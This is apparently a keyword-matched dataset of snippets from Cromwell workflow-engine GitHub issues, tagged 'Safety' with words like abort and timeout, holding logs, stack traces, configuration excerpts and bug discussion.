dead letters encountered, no more dead letters will be logged. If this is not an expected behavior, then [Actor[akka://cromwell-system/user/cromwell-service/WorkflowManagerActor/WorkflowActor-a06a4c5e-fbf7-4c1d-ac71-b036aaf48fbc/WorkflowExecutionActor-a06a4c5e-fbf7-4c1d-ac71-b036aaf48fbc#659989485]] may have terminated unexpectedly, This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; ```; ```; {; 	""status"": ""Aborting"",; 	""id"": ""a06a4c5e-fbf7-4c1d-ac71-b036aaf48fbc""; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7386:9284,Abort,Aborting,9284,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7386,1,['Abort'],['Aborting']
Safety,"ipelines v2 only: specify the number of times localization and delocalization operations should be attempted; # There is no logic to determine if the error was transient or not, everything is retried upon failure; # Defaults to 3; localization-attempts = 3. # Specifies the minimum file size for `gsutil cp` to use parallel composite uploads during delocalization.; # Parallel composite uploads can result in a significant improvement in delocalization speed for large files; # but may introduce complexities in downloading such files from GCS, please see; # https://cloud.google.com/storage/docs/gsutil/commands/cp#parallel-composite-uploads for more information.; #; # If set to 0 parallel composite uploads are turned off. The default Cromwell configuration turns off; # parallel composite uploads, this sample configuration turns it on for files of 150M or larger.; parallel-composite-upload-threshold=""150M""; }. # Controls how batched requests to PAPI are handled:; batch-requests {; timeouts {; # Timeout when attempting to connect to PAPI to make requests:; # read = 10 seconds. # Timeout waiting for batch responses from PAPI:; #; # Note: Try raising this value if you see errors in logs like:; # WARN - PAPI request worker PAPIQueryWorker-[...] terminated. 99 run creation requests, 0 status poll requests, and 0 abort requests will be reconsidered. If any of those succeeded in the cloud before the batch request failed, they might be run twice.; # ERROR - Read timed out; # connect = 10 seconds; }; }; filesystems {; gcs {; # A reference to a potentially different auth for manipulating files via engine functions.; auth = ""application-default""; # Google project which will be billed for the requests; project = ""xxxxx-xxxxx-xxxxx"". caching {; # When a cache hit is found, the following duplication strategy will be followed to use the cached outputs; # Possible values: ""copy"", ""reference"". Defaults to ""copy""; # ""copy"": Copy the output files; # ""reference"": DO NOT copy the output files b",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6462:4518,timeout,timeouts,4518,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6462,2,"['Timeout', 'timeout']","['Timeout', 'timeouts']"
Safety,"ipelines v2 only: specify the number of times localization and delocalization operations should be attempted; # There is no logic to determine if the error was transient or not, everything is retried upon failure; # Defaults to 3; localization-attempts = 3. # Specifies the minimum file size for `gsutil cp` to use parallel composite uploads during delocalization.; # Parallel composite uploads can result in a significant improvement in delocalization speed for large files; # but may introduce complexities in downloading such files from GCS, please see; # https://cloud.google.com/storage/docs/gsutil/commands/cp#parallel-composite-uploads for more information.; #; # If set to 0 parallel composite uploads are turned off. The default Cromwell configuration turns off; # parallel composite uploads, this sample configuration turns it on for files of 150M or larger.; parallel-composite-upload-threshold=""150M""; }. # Controls how batched requests to PAPI are handled:; batch-requests {; timeouts {; # Timeout when attempting to connect to PAPI to make requests:; # read = 10 seconds. # Timeout waiting for batch responses from PAPI:; #; # Note: Try raising this value if you see errors in logs like:; # WARN - PAPI request worker PAPIQueryWorker-[...] terminated. 99 run creation requests, 0 status poll requests, and 0 abort requests will be reconsidered. If any of those succeeded in the cloud before the batch request failed, they might be run twice.; # ERROR - Read timed out; # connect = 10 seconds; }; }; filesystems {; gcs {; # A reference to a potentially different auth for manipulating files via engine functions.; auth = ""service-account""; # Google project which will be billed for the requests; project = ""***-***"". caching {; # When a cache hit is found, the following duplication strategy will be followed to use the cached outputs; # Possible values: ""copy"", ""reference"". Defaults to ""copy""; # ""copy"": Copy the output files; # ""reference"": DO NOT copy the output files but point to th",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6469:14164,timeout,timeouts,14164,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6469,2,"['Timeout', 'timeout']","['Timeout', 'timeouts']"
Safety,"is.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:19,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:20,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:21,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:22,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:23,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:24,84] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:432); at com.google.api.client.googleapis.services.AbstractGoogleCl",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:7628,abort,abort,7628,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"is.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:24,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:25,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:26,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:27,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:28,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:29,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:30,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:31,53] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.Abstra",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:9729,abort,abort,9729,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"is.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:31,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:32,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:33,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:34,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:35,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:36,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:37,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:38,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:39,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:40,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:41,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:42,05] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogle",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:11968,abort,abort,11968,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"is.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:42,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:43,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:44,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:45,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:46,38] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:432); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); at",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:14483,abort,abort,14483,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"is.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:46,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:47,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:48,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:49,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:50,94] [info] Waiting for 1 workflows to abort...; ^C[2016-10-27 13:10:51,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:52,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:53,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:54,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:55,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:56,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:57,16] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoog",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:16515,abort,abort,16515,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"is.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:57,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:58,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:59,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:00,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:01,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:02,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:03,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:04,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:05,57] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClient",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:19032,abort,abort,19032,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"is.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:11:05,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:06,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:07,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:08,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:09,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:10,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:11,95] [info] Waiting for 1 workflows to abort...; Killed; lichtens@lichtens-big:~/test_eval$ [2016-10-27 13:11:12,80] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.g",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:21340,abort,abort,21340,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,ispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.UnsupportedOperationException: Neither execute() nor executeAsync() implemented by class cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor; 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute(StandardAsyncExecutionActor.scala:805); 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute$(StandardAsyncExecutionActor.scala:804); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.execute(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover(StandardAsyncExecutionActor.scala:821); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover$(StandardAsyncExecutionActor.scala:821); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.recover(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:829); 	at scala.util.Try$.apply(Try.scala:210); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:829); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:829); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.recoverAsync(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:1253); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:1248); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.executeOrRecover(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7495:8069,recover,recover,8069,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7495,1,['recover'],['recover']
Safety,"isting workflow for Mutect2 available here: https://app.terra.bio/#workspaces/terra-outreach/CHIP-Detection-Mutect2 to run on SLURM with Singularity configuration. There are multiple steps similar to Mutect2 public workflow available here: https://github.com/broadinstitute/gatk/blob/master/scripts/mutect2_wdl/mutect2.wdl , but still attaching the modified WDL with additional steps. . So when we run this with the given configuration using the following; export SINGULARITY_CACHEDIR=$PWD/singularity_cache; export SINGULARITY_TMPDIR=$PWD/tmpdir; module load singularity; rm -rf nohup.out && nohup java -Dconfig.file=$PWD/cromwell_singularity.conf -jar $PWD/cromwell-84.jar run $PWD/mutect2_modified.wdl --inputs $PWD/inputs.json &. The issue is that the first step of splitting intervals runs fine, but as it starts mutect2, it starts copying of the complete execution directory making here is the directory structure. cromwell-executions/; └── Mutect2; └── e5769b79-5e02-44a5-a4f8-38745e152beb; ├── call-M2; │ └── shard-0; │ ├── execution; │ └── inputs; │ ├── -1816294717; │ ├── 1855713868; │ │ └── run_cromwell_only.tmp; │ │ └── cromwell-executions; │ │ └── Mutect2; │ │ └── e5769b79-5e02-44a5-a4f8-38745e152beb; │ ├── 2035192126; │ └── 891763929; └── call-SplitIntervals; ├── execution; │ ├── glob-0fc990c5ca95eebc97c4c204e3e303e1; │ └── interval-files; ├── inputs; │ └── -1816294717; └── tmp.c9d96672. As you can see that run_cromwell_only.tmp is being made and that happens to fall in an endless loop and eventually, it errors stating the file name is too long to copy. Can you help me how to avoid this behavior of making circular paths when copying files for execution? Also, note it does not happen in the first step of SplitIntervals but happens in the Mutect2 call. [mutect2_gatk.wdl.txt](https://github.com/broadinstitute/cromwell/files/9813528/mutect2_gatk.wdl.txt); [cromwell_singularity.conf.txt](https://github.com/broadinstitute/cromwell/files/9813529/cromwell_singularity.conf.txt)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6934:1633,avoid,avoid,1633,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6934,1,['avoid'],['avoid']
Safety,it's trivial to do. there's a slight risk involved in that theoretically some WDL would be broken but there's a 100% chance those WDLs become broken in the future anyways.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1312#issuecomment-335815243:37,risk,risk,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1312#issuecomment-335815243,1,['risk'],['risk']
Safety,"just want to also be sure to make it clear there are more issues related to that forum post than this specific issue - this one is on making sure the task statuses reach a final state when the workflow ends in a terminal state - that's different than aborts not working - both are an issue, but different",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334478731:251,abort,aborts,251,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334478731,2,['abort'],['aborts']
Safety,"ka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:46,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:47,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:48,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:49,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:50,94] [info] Waiting for 1 workflows to abort...; ^C[2016-10-27 13:10:51,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:52,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:53,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:54,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:55,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:56,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:57,16] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.jav",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:16862,abort,abort,16862,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"l's activity when it's building a metadata of around 2.8M metadata events. Building metadata without streaming:; ![screen shot 2018-10-17 at 11 16 32 am](https://user-images.githubusercontent.com/2978948/47925639-134b5e80-de95-11e8-8ce3-43f52c4a4067.png). We can see that memory builds up throughout the process of generating the JSON, with a larger burst towards the end. CPU activity is inexistent until the very end where a lot of CPU resources are needed to go through all the events and build the json. Building metadata with streaming:; ![screen shot 2018-10-17 at 10 08 08 am](https://user-images.githubusercontent.com/2978948/47925627-0d557d80-de95-11e8-8ad0-14444456c05a.png). In contrast, here there is moderate CPU activity throughout the process, as well as lots of a much more sawtooth-looking heap graph, indicating that objects are getting GCed a lot. The max memory used is also smaller than for the non streaming version. - Using a streaming approach allows the stream to be stopped at any point in time (say if we ran over the endpoint timeout).; Note that even without streaming data from the database, we can still build the json from the strict set of events using an fs2 stream and stop that if/when needed. Another graph where Cromwell was asked to build several large metadata jsons:. ![screen shot 2018-10-19 at 1 17 28 pm](https://user-images.githubusercontent.com/2978948/47926437-ee57eb00-de96-11e8-89b4-a7df8db9e164.png); Red is non streaming, blue is streaming. ---; The main takeaway is that when **under memory pressure** (i.e when available memory is insufficient to build the requested metadata), streaming makes a significant difference on relieving the heap usage for medium to large (> 100K) metadata. ### The less good. - Response time is not as good. The use cases above were specifically targeted towards trying to build large to very large metadata.; However when used in a more realistic scenario with lots of small sized metadata and few large ones, the over",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4124#issuecomment-435955806:1590,timeout,timeout,1590,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4124#issuecomment-435955806,1,['timeout'],['timeout']
